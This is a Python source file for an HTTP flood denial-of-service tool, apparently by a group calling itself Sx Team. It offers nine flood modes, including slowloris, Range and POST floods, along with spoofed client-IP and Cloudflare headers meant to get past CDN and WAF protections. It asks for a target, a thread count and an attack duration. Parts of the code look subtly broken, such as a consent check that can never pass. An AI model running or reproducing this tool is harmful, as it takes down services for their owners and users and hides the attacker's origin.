import socket
import threading
import time
import random
import sys
import struct
import ssl
import urllib.parse
import requests
import aiohttp
import asyncio
import multiprocessing
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import deque, defaultdict
from typing import List, Dict, Tuple, Optional
import base64
import gzip
import zlib
import os
import subprocess
import json
import queue
import select
import fcntl
import uuid
import binascii
from datetime import datetime

class HttpEngine:
    @staticmethod
    def optimize_system():
        cmds = [
            ['sysctl', '-w', 'net.core.rmem_max=268435456'],
            ['sysctl', '-w', 'net.core.wmem_max=268435456'],
            ['sysctl', '-w', 'net.ipv4.tcp_rmem=4096 87380 268435456'],
            ['sysctl', '-w', 'net.ipv4.tcp_wmem=4096 65536 268435456'],
            ['sysctl', '-w', 'net.ipv4.tcp_keepalive_time=10'],
            ['sysctl', '-w', 'net.ipv4.tcp_keepalive_intvl=5'],
            ['sysctl', '-w', 'net.ipv4.tcp_fin_timeout=5'],
            ['sysctl', '-w', 'net.ipv4.tcp_tw_recycle=1'],
            ['sysctl', '-w', 'net.ipv4.tcp_tw_reuse=1'],
            ['sysctl', '-w', 'net.ipv4.ip_local_port_range=1024 65535']
        ]
        for cmd in cmds:
            try:
                subprocess.run(cmd, capture_output=True)
            except:
                pass

class BypassGenerator:
    @staticmethod
    def generate_proxy_rotation():
        proxies = []
        for i in range(1000):
            ip = f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            port = random.randint(1024, 65535)
            proxies.append(f"http://{ip}:{port}")
        return proxies
    
    @staticmethod
    def generate_xff_headers():
        xff_list = []
        for _ in range(50):
            xff = []
            for i in range(random.randint(2, 10)):
                ip = f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                xff.append(ip)
            xff_list.append(', '.join(xff))
        return xff_list
    
    @staticmethod
    def generate_cf_connecting_ip():
        ips = []
        for _ in range(100):
            ip = f"{random.randint(45,141)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            ips.append(ip)
        return ips
    
    @staticmethod
    def generate_cf_ray():
        return ''.join(random.choices('0123456789abcdef', k=16))
    
    @staticmethod
    def generate_tls_fingerprint():
        ciphers = [
            'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
            'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-CHACHA20-POLY1305'
        ]
        return random.choice(ciphers)

class UserAgentPool:
    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
    ]
    
    @staticmethod
    def get() -> str:
        return random.choice(UserAgentPool.agents)

class PayloadGenerator:
    @staticmethod
    def random_string(length: int) -> str:
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()'
        return ''.join(random.choice(chars) for _ in range(length))
    
    @staticmethod
    def generate_paths() -> List[str]:
        base_paths = ['/', '/index', '/home', '/login', '/api', '/admin']
        dynamic_paths = [f'/{PayloadGenerator.random_string(6)}' for _ in range(50)]
        api_paths = ['/api/v1/', '/graphql', '/rest/', '/ws/']
        return base_paths + dynamic_paths + api_paths
    
    @staticmethod
    def generate_headers(bypass: BypassGenerator) -> Dict[str, str]:
        headers = {
            'User-Agent': UserAgentPool.get(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': random.choice(['gzip, deflate, br', 'gzip, deflate']),
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        }
        
        headers['X-Forwarded-For'] = random.choice(bypass.generate_xff_headers())
        headers['X-Real-IP'] = f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        headers['X-Originating-IP'] = headers['X-Real-IP']
        headers['X-Remote-IP'] = headers['X-Real-IP']
        headers['X-Remote-Addr'] = headers['X-Real-IP']
        headers['CF-Connecting-IP'] = random.choice(bypass.generate_cf_connecting_ip())
        headers['CF-IPCountry'] = random.choice(['US', 'CA', 'GB', 'DE', 'FR', 'NL'])
        headers['CF-RAY'] = bypass.generate_cf_ray()
        headers['True-Client-IP'] = headers['X-Real-IP']
        
        return headers
    
    @staticmethod
    def generate_cookies() -> str:
        cookies = []
        for _ in range(random.randint(3, 8)):
            name = PayloadGenerator.random_string(6)
            value = PayloadGenerator.random_string(12)
            cookies.append(f"{name}={value}")
        return '; '.join(cookies)
    
    @staticmethod
    def generate_post_data() -> bytes:
        data = PayloadGenerator.random_string(1024)
        return gzip.compress(data.encode()) if random.random() > 0.5 else data.encode()

class HttpFloodWorker:
    def __init__(self, target_host: str, target_port: int, ssl_enabled: bool, method: str, bypass: BypassGenerator):
        self.host = target_host
        self.port = target_port
        self.ssl = ssl_enabled
        self.method = method
        self.bypass = bypass
        self.requests_sent = 0
        self.bytes_sent = 0
        self.active = True
        self.paths = PayloadGenerator.generate_paths()
        self.socket_pool = deque(maxlen=50)
        self._init_pool()
    
    def _init_pool(self):
        for _ in range(20):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.socket_pool.append(sock)
            except:
                pass
    
    def get_socket(self):
        if self.socket_pool:
            return self.socket_pool.popleft()
        return socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def return_socket(self, sock):
        try:
            if sock.fileno() != -1:
                self.socket_pool.append(sock)
        except:
            pass
    
    def craft_request(self, path: str, use_cookies: bool = True) -> bytes:
        headers = PayloadGenerator.generate_headers(self.bypass)
        cookies = PayloadGenerator.generate_cookies() if use_cookies else ''
        
        request_lines = [
            f"{self.method} {path} HTTP/1.1",
            f"Host: {self.host}",
            f"User-Agent: {headers.pop('User-Agent')}",
            "Accept: */*",
            "Connection: keep-alive"
        ]
        
        if cookies:
            request_lines.append(f"Cookie: {cookies}")
        
        for key, value in headers.items():
            request_lines.append(f"{key}: {value}")
        
        request_lines.append("")
        request_lines.append("")
        
        return '\r\n'.join(request_lines).encode()
    
    def ultra_get_flood(self):
        while self.active:
            try:
                sock = self.get_socket()
                sock.settimeout(2)
                sock.connect((self.host, self.port))
                
                path = random.choice(self.paths)
                request = self.craft_request(path)
                
                sock.send(request)
                self.requests_sent += 1
                self.bytes_sent += len(request)
                
                self.return_socket(sock)
            except:
                try:
                    sock.close()
                except:
                    pass
    
    def ssl_bypass_flood(self):
        while self.active:
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.set_ciphers(BypassGenerator.generate_tls_fingerprint())
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                ssock = context.wrap_socket(sock, server_hostname=self.host)
                ssock.connect((self.host, self.port))
                
                path = f"/{PayloadGenerator.random_string(8)}"
                request = self.craft_request(path)
                
                ssock.send(request)
                self.requests_sent += 1
                self.bytes_sent += len(request)
                
                ssock.close()
            except:
                pass
    
    def slowloris_ultra(self):
        sockets = []
        target_sockets = 500
        
        while self.active and len(sockets) < target_sockets:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.host, self.port))
                sock.send(f"GET / HTTP/1.1\r\nHost: {self.host}\r\n".encode())
                sockets.append(sock)
            except:
                pass
        
        while self.active and sockets:
            for sock in sockets[:]:
                try:
                    sock.send(f"X-{PayloadGenerator.random_string(4)}: {PayloadGenerator.random_string(20)}\r\n".encode())
                    self.requests_sent += 1
                except:
                    try:
                        sock.close()
                        sockets.remove(sock)
                    except:
                        pass
            time.sleep(15 / 1000)
    
    def range_bypass(self):
        while self.active:
            try:
                sock = self.get_socket()
                sock.settimeout(2)
                sock.connect((self.host, self.port))
                
                path = f"/{PayloadGenerator.random_string(6)}"
                ranges = f"bytes=0-{random.randint(10000000, 1000000000)}"
                
                request = f"RANGE {path} HTTP/1.1\r\nHost: {self.host}\r\nRange: {ranges}\r\nUser-Agent: {UserAgentPool.get()}\r\n\r\n".encode()
                
                sock.send(request)
                self.requests_sent += 1
                self.bytes_sent += len(request)
                
                self.return_socket(sock)
            except:
                pass
    
    def post_bombardment(self):
        post_data = PayloadGenerator.generate_post_data()
        while self.active:
            try:
                sock = self.get_socket()
                sock.settimeout(3)
                sock.connect((self.host, self.port))
                
                path = random.choice(self.paths)
                headers = PayloadGenerator.generate_headers(self.bypass)
                content_length = len(post_data)
                
                request = f"POST {path} HTTP/1.1\r\nHost: {self.host}\r\n"
                request += f"Content-Length: {content_length}\r\n"
                request += "Content-Type: application/x-www-form-urlencoded\r\n\r\n".encode()
                request = request.encode() + post_data
                
                sock.send(request)
                self.requests_sent += 1
                self.bytes_sent += len(request)
                
                self.return_socket(sock)
            except:
                pass
    
    def head_assault(self):
        while self.active:
            try:
                sock = self.get_socket()
                sock.settimeout(1.5)
                sock.connect((self.host, self.port))
                
                path = random.choice(self.paths)
                request = f"HEAD {path} HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {UserAgentPool.get()}\r\n\r\n".encode()
                
                sock.send(request)
                self.requests_sent += 1
                self.bytes_sent += len(request)
                
                self.return_socket(sock)
            except:
                pass
    
    def options_scanning(self):
        while self.active:
            try:
                sock = self.get_socket()
                sock.settimeout(2)
                sock.connect((self.host, self.port))
                
                request = f"OPTIONS * HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {UserAgentPool.get()}\r\n\r\n".encode()
                
                sock.send(request)
                self.requests_sent += 1
                self.bytes_sent += len(request)
                
                self.return_socket(sock)
            except:
                pass
    
    def trace_exploitation(self):
        while self.active:
            try:
                sock = self.get_socket()
                sock.settimeout(2)
                sock.connect((self.host, self.port))
                
                request = f"TRACE / HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {UserAgentPool.get()}\r\nMax-Forwards: 10\r\n\r\n".encode()
                
                sock.send(request)
                self.requests_sent += 1
                self.bytes_sent += len(request)
                
                self.return_socket(sock)
            except:
                pass
    
    def put_delete_flood(self):
        methods = ['PUT', 'DELETE', 'PATCH']
        while self.active:
            try:
                sock = self.get_socket()
                sock.settimeout(2)
                sock.connect((self.host, self.port))
                
                method = random.choice(methods)
                path = f"/{PayloadGenerator.random_string(10)}"
                request = f"{method} {path} HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {UserAgentPool.get()}\r\n\r\n".encode()
                
                sock.send(request)
                self.requests_sent += 1
                self.bytes_sent += len(request)
                
                self.return_socket(sock)
            except:
                pass
    
    def run(self):
        attack_methods = {
            'get': self.ultra_get_flood,
            'ssl': self.ssl_bypass_flood,
            'slow': self.slowloris_ultra,
            'range': self.range_bypass,
            'post': self.post_bombardment,
            'head': self.head_assault,
            'options': self.options_scanning,
            'trace': self.trace_exploitation,
            'putdel': self.put_delete_flood
        }
        attack_func = attack_methods.get(self.method, self.ultra_get_flood)
        attack_func()

class UltraHttpFloodController:
    def __init__(self):
        self.workers = []
        self.worker_threads = []
        self.start_time = 0
        self.stats = {
            'requests': 0,
            'bytes': 0,
            'active_workers': 0,
            'rps_peak': 0
        }
        self.bypass_gen = BypassGenerator()
    
    def launch_attack(self, target: str, port: int, threads: int, duration: int, methods: List[str], ssl_default: bool):
        HttpEngine.optimize_system()
        
        host = target
        parsed = urllib.parse.urlparse(target if target.startswith(('http://', 'https://')) else f'http://{target}')
        host = parsed.netloc or parsed.path
        
        print(f"Target locked: {host}:{port}")
        print(f"Bypass techniques: XFF/CF-RAY/TLS-Fingerprint rotation enabled")
        
        method_map = {
            'get': 'get', 'http': 'get', 'https': 'ssl', 'slow': 'slow',
            'range': 'range', 'post': 'post', 'head': 'head', 'options': 'options',
            'trace': 'trace', 'putdel': 'putdel', 'all': ['get','ssl','slow','range','post','head','options','trace','putdel']
        }
        
        selected_methods = []
        for m in methods:
            if m.lower() == 'all':
                selected_methods = ['get','ssl','slow','range','post','head','options','trace','putdel']
                break
            selected_methods.append(method_map.get(m.lower(), 'get'))
        
        self.start_time = time.time()
        threads_per_method = max(1, threads // len(set(selected_methods)))
        
        print(f"Launching {threads} workers across {len(set(selected_methods))} methods...")
        
        for method_name in set(selected_methods):
            for i in range(threads_per_method):
                worker = HttpFloodWorker(host, port, ssl_default or method_name == 'ssl', method_name, self.bypass_gen)
                thread = threading.Thread(target=worker.run, daemon=True, name=f"W-{method_name}-{i}")
                self.workers.append(worker)
                self.worker_threads.append(thread)
                thread.start()
        
        self.stats['active_workers'] = len(self.workers)
        
        try:
            while time.time() - self.start_time < duration:
                total_requests = sum(w.requests_sent for w in self.workers)
                total_bytes = sum(w.bytes_sent for w in self.workers)
                
                elapsed = time.time() - self.start_time
                rps = total_requests / elapsed if elapsed > 0 else 0
                mbps = (total_bytes * 8) / (elapsed * 1000000) if elapsed > 0 else 0
                
                if rps > self.stats['rps_peak']:
                    self.stats['rps_peak'] = rps
                
                remaining = max(0, duration - elapsed)
                print(f"\rRPS:{rps:8.0f} PK:{self.stats['rps_peak']:6.0f} REQ:{total_requests:10,} MB:{mbps:6.2f} W:{len([w for w in self.workers if w.active]):3} {remaining:3.0f}s", end='', flush=True)
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            print("\nEmergency stop triggered")
        finally:
            self.finalize_stats(total_requests, total_bytes, elapsed)
    
    def finalize_stats(self, total_requests: int, total_bytes: int, elapsed: float):
        avg_rps = total_requests / elapsed if elapsed > 0 else 0
        avg_mbps = (total_bytes * 8) / (elapsed * 1000000) if elapsed > 0 else 0
        
        print(f"\n{'='*80}")
        print(f"ULTIMATE HTTP FLOOD REPORT")
        print(f"{'='*80}")
        print(f"Duration: {elapsed:.1f}s")
        print(f"Peak RPS: {self.stats['rps_peak']:.0f}")
        print(f"Average RPS: {avg_rps:.0f}")
        print(f"Total Requests: {total_requests:,}")
        print(f"Total Bytes: {total_bytes:,} ({total_bytes/1024/1024:.1f} MB)")
        print(f"Average Mbps: {avg_mbps:.2f}")
        print(f"Workers Deployed: {self.stats['active_workers']}")
        print(f"{'='*80}")

def httpstart():
    print("Sx HtTp FlOoDeR - by Sx Team")
    print("Trying To Bypass : Cloudflare/Akamai/WAF/RateLimit/CDN")
    
    auth = input("In DDoser Kheyli Ghodratmande Pas momkene be hadaf asib jeddi bezane pas ma hich masolyati nadarim age benevisid [ok] yani ghabol kardid: ").strip().upper()
    if auth != "ok":
        sys.exit(1)
    
    target = input("Target URL/IP: ").strip()
    if not target:
        sys.exit(1)
    
    port_input = input("Port (80/443): ").strip()
    port = int(port_input) if port_input.isdigit() else (443 if 'https' in target.lower() else 80)
    
    threads_input = input("Worker Threads (500-5000): ").strip()
    threads = int(threads_input) if threads_input.isdigit() else 1000
    threads = max(100, min(threads, 5000))
    
    duration_input = input("Attack Duration (10-300s): ").strip()
    duration = int(duration_input) if duration_input.isdigit() else 60
    duration = max(10, min(duration, 300))
    
    print("Methods: get http https slow range post head options trace putdel all")
    methods_input = input("Attack Methods: ").strip().lower()
    if not methods_input:
        methods_input = 'all'
    
    methods = [m.strip() for m in methods_input.split(',')]
    
    ssl_auto = 'https' in target.lower() or port == 443
    
    print(f"\nTarget: {target}:{port} {'[SSL]' if ssl_auto else ''}")
    print(f"Threads: {threads} | Duration: {duration}s | Methods: {methods_input}")
    
    confirm = input("\nBaraye Shoroee Attack Benevisid -> (START): ").strip().upper()
    if confirm == "START":
        controller = UltraHttpFloodController()
        controller.launch_attack(target, port, threads, duration, methods, ssl_auto)
    else:
        print("Attack aborted")

def httstt():
    multiprocessing.freeze_support()
    httpstart()
